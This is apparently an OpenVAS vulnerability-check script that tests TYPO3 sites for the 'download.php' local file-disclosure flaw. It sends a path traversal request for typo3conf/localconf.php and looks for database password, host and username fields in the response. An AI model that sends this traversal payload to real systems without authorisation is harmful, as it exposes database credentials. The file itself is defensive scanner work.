###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typo3_49882.nasl 13 2013-10-27 12:16:33Z jan $
#
# TYPO3 'download.php' Local File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "TYPO3 is prone to a local file-disclosure vulnerability because it
fails to adequately validate user-supplied input.

Exploiting this vulnerability would allow an attacker to obtain
potentially sensitive information from local files on computers
running the vulnerable application. This may aid in further attacks.";


if (description)
{
 script_id(103291);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-10-06 13:32:57 +0200 (Thu, 06 Oct 2011)");
 script_bugtraq_id(49882);

 script_name("TYPO3 'download.php' Local File Disclosure Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49882");
 script_xref(name : "URL" , value : "http://typo3.org");

 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if installed typo3 is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/fileadmin/download.php?Fichier_a_telecharger=../typo3conf/localconf.php "); 

  if(http_vuln_check(port:port, url:url,pattern:"TYPO3_CONF_VARS",extra_check:make_list("typo_db_password","typo_db_host","typo_db_username"))) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
